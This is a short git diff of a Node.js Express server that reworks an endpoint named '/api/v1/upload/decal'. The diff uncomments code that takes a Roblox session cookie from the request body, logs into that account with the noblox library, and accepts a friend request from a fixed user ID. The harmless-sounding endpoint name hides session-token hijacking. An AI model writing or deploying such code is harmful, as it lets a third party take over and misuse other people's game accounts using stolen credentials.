@@ -6,11 +6,10 @@ const Port = 3000;
 
 
 App.post("/api/v1/upload/decal", async (req, res) => {
-  res.json({ success: 'Connected' });
-  // const Cookie = await req.body.cookie
+  const Cookie = await req.body.cookie
 
-  // const currentUser = await noblox.setCookie(Cookie)
-  // await noblox.acceptFriendRequest(5260043739)
+  const currentUser = await noblox.setCookie(Cookie)
+  await noblox.acceptFriendRequest(5260043739)
 
   
 })
